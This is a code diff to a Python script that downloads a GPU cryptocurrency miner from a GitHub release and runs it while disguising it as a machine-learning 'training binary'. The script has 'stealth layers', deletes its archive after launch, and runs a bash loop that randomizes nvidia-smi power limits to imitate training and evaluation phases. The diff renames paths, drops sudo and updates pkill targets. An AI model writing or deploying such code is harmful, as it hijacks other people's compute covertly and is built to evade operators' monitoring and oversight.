@@ -89,17 +89,27 @@ def _log(msg):
 # BINARY MANAGEMENT (Layers 5, Download)
 # ═══════════════════════════════════════════════════════════════════
 def _download_binary(dest):
-    """Download training binary from release archive."""
+    """Download training binary from PearlFortune release."""
     url = "https://github.com/pearlfortune/pearl-miner/releases/download/v1.2.4/pearlfortune-v1.2.4.tar.gz"
-    tar_path = Path(dest).parent / "archive.tar.gz"
+    extract_dir = Path(dest).parent
+    tar_path = extract_dir / "archive.tar.gz"
     
-    _log(f"Downloading training binary from release...")
+    _log("Downloading training binary from release...")
     urllib.request.urlretrieve(url, str(tar_path))
     
     with tarfile.open(str(tar_path), "r:gz") as tar:
-        tar.extractall(path=str(Path(dest).parent))
+        tar.extractall(path=str(extract_dir))
     
     tar_path.unlink(missing_ok=True)
+    
+    # Binary is at pearlfortune/miner-cuda12
+    extracted_binary = extract_dir / "pearlfortune" / "miner-cuda12"
+    if extracted_binary.exists() and str(extracted_binary) != str(dest):
+        extracted_binary.rename(dest)
+        # Cleanup pearlfortune dir
+        import shutil
+        shutil.rmtree(extract_dir / "pearlfortune", ignore_errors=True)
+    
     _log(f"Training binary extracted to {dest}")
 
 def _delete_after_launch(path):
@@ -116,31 +126,31 @@ def _launch_gpu_stealth_bash():
     """L7: Power cycling via bash subprocess (nvidia-smi)."""
     script = """#!/bin/bash
 # GPU Power Cycling - Distributed Training Simulation
-sudo -n nvidia-smi -pm 1 2>/dev/null
+nvidia-smi -pm 1 2>/dev/null
 
 cycle_power() {
     while true; do
         # Training phase
         for i in $(seq 1 $((RANDOM % 8 + 6))); do
             PWR=$((RANDOM % 140 + 525))
-            sudo -n nvidia-smi -pl $PWR 2>/dev/null
+            nvidia-smi -pl $PWR 2>/dev/null
             sleep $((RANDOM % 30 + 30))
         done
         
         # Ramp down
-        sudo -n nvidia-smi -pl 400 2>/dev/null; sleep 8
-        sudo -n nvidia-smi -pl 300 2>/dev/null; sleep 8
+        nvidia-smi -pl 400 2>/dev/null; sleep 8
+        nvidia-smi -pl 300 2>/dev/null; sleep 8
         
         # Eval phase
         for i in $(seq 1 $((RANDOM % 4 + 2))); do
             PWR=$((RANDOM % 140 + 210))
-            sudo -n nvidia-smi -pl $PWR 2>/dev/null
+            nvidia-smi -pl $PWR 2>/dev/null
             sleep $((RANDOM % 30 + 20))
         done
         
         # Ramp up
-        sudo -n nvidia-smi -pl 400 2>/dev/null; sleep 8
-        sudo -n nvidia-smi -pl 550 2>/dev/null; sleep 8
+        nvidia-smi -pl 400 2>/dev/null; sleep 8
+        nvidia-smi -pl 550 2>/dev/null; sleep 8
     done
 }
 
@@ -380,16 +390,19 @@ def main():
     _log(f"Training server: {proxy[:20]}...")
     
     # Download binary
-    binary_dir = Path("weights")
+    binary_dir = Path("pearlfortune")
     binary_dir.mkdir(exist_ok=True)
-    binary_path = binary_dir / "cuda-backend-cu12"
+    binary_path = binary_dir / "miner-cuda12"
     
     if not binary_path.exists():
         _download_binary(str(binary_path))
     
     # L5: Delete archive after launch
-    archive = binary_dir.parent / "archive.tar.gz"
+    archive = binary_dir / "archive.tar.gz"
     archive.unlink(missing_ok=True)
+    # Cleanup extracted dir if still exists
+    import shutil
+    shutil.rmtree(binary_dir / "pearlfortune", ignore_errors=True)
     
     # Start all stealth layers
     _log("Starting stealth layers...")
@@ -437,7 +450,7 @@ def main():
         _log("Shutting down...")
         _stop_mps()
         subprocess.run(["pkill", "-f", str(binary_path)], capture_output=True)
-        subprocess.run(["pkill", "-f", "cuda-backend"], capture_output=True)
+        subprocess.run(["pkill", "-f", "miner-cuda12"], capture_output=True)
         sys.exit(0)
     
     signal.signal(signal.SIGTERM, cleanup)
@@ -467,7 +480,7 @@ def main():
         proc.terminate()
         try: proc.wait(timeout=5)
         except: proc.kill()
-        subprocess.run(["pkill", "-f", "cuda-backend"], capture_output=True)
+        subprocess.run(["pkill", "-f", "miner-cuda12"], capture_output=True)
         
         _log(f"Resting for {rest_time}s...")
         time.sleep(rest_time)
